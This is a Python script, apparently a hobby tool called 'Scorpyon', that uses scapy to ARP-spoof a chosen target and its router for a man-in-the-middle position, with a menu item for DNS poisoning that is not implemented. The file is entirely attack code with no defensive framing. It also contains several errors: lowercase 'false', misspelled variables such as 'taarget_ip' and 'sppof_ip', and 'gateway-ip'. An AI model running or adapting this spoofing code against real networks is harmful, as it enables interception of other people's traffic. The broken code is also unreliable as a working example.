import sys
import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout = 1, verbose = false)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None
def spoof(taarget_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("Could not find MAC for ", target_ip)
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sppof_ip)
    scapy.send(packet, verbose = False)
def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
print("[...Scorpyon...]")
print("1. ARP spoofing \n2. DNS poisoning")
arp_dns=input()
if arp_dns == '1':
    target_ip=input("Please input the target IP: ")
    gateway_ip=input("Please input the router IP: ")
    try:
        sent_packets=0
        print("Starting ARP spoofing...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet+=2
            print("\rPackets sent: ", sent_packets, end ="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n Resetting ARP tables")
        restore(target_ip, gateway-ip)
        restore(gateway_ip, target_ip)
        print("Bye")
else:
    print("No other functionalities implemented yet, please select from the list")
